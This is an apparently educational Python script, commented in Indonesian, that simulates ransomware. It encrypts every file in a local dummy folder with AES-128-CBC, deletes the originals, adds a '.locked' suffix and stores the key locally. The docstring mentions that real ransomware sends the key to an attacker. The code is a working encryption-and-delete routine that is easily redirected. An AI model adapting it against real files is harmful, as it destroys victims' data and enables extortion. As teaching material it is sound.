"""
Simulasi enkripsi ransomware menggunakan AES-128 CBC (educational only).
File di dummy-files/ dienkripsi dengan AES-128, lalu diberi ekstensi .locked.
Kunci AES dan IV disimpan di encryption_key.json (simulasi — di ransomware nyata
kunci dikirim ke server attacker sehingga korban tidak bisa decrypt sendiri).
"""

import json
import os
import secrets
from pathlib import Path

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding

BASE_DIR = Path(__file__).resolve().parent
DUMMY_DIR = BASE_DIR / "dummy-files"
KEY_FILE  = BASE_DIR / "encryption_key.json"
SUFFIX    = ".locked"

KEY_SIZE   = 16   # AES-128 = 16 bytes
BLOCK_SIZE = 128  # bits


def pad_data(data: bytes) -> bytes:
    """PKCS7 padding agar data kelipatan 16 bytes (block size AES)."""
    padder = padding.PKCS7(BLOCK_SIZE).padder()
    return padder.update(data) + padder.finalize()


def encrypt_file(path: Path, key: bytes, iv: bytes) -> dict:
    """Enkripsi satu file dengan AES-128 CBC."""
    original_size = path.stat().st_size
    plaintext     = path.read_bytes()

    cipher     = Cipher(algorithms.AES(key), modes.CBC(iv))
    encryptor  = cipher.encryptor()
    ciphertext = encryptor.update(pad_data(plaintext)) + encryptor.finalize()

    locked_path = path.with_name(path.name + SUFFIX)
    locked_path.write_bytes(ciphertext)
    path.unlink()

    encrypted_size = locked_path.stat().st_size
    size_diff      = encrypted_size - original_size

    print(
        f"[ENCRYPTED] {path.name} -> {locked_path.name} | "
        f"Sebelum: {original_size} B | Sesudah: {encrypted_size} B | "
        f"Selisih: +{size_diff} B"
    )

    return {
        "original_name":   path.name,
        "encrypted_name":  locked_path.name,
        "original_size":   original_size,
        "encrypted_size":  encrypted_size,
        "size_difference": size_diff,
    }


def main() -> list:
    if not DUMMY_DIR.is_dir():
        print(f"Folder tidak ditemukan: {DUMMY_DIR}")
        return []

    key = secrets.token_bytes(KEY_SIZE)
    iv  = secrets.token_bytes(KEY_SIZE)

    results   = []
    encrypted = 0
    skipped   = 0

    print("=== RANSOMWARE SIMULATION — AES-128 CBC ===")
    print(f"Key (hex): {key.hex()}")
    print(f"IV  (hex): {iv.hex()}")
    print("=" * 45)

    for path in sorted(DUMMY_DIR.iterdir()):
        if not path.is_file():
            continue
        if path.name.endswith(SUFFIX):
            print(f"[SKIP] Sudah terenkripsi: {path.name}")
            skipped += 1
            continue

        info = encrypt_file(path, key, iv)
        results.append(info)
        encrypted += 1

    key_data = {
        "algorithm": "AES-128-CBC",
        "key_hex":   key.hex(),
        "iv_hex":    iv.hex(),
        "files":     results,
    }
    KEY_FILE.write_text(json.dumps(key_data, indent=2))

    print("=" * 45)
    print(f"Selesai. Dienkripsi: {encrypted}, dilewati: {skipped}")
    print(f"Key disimpan di: {KEY_FILE.name}")
    return results


if __name__ == "__main__":
    main()
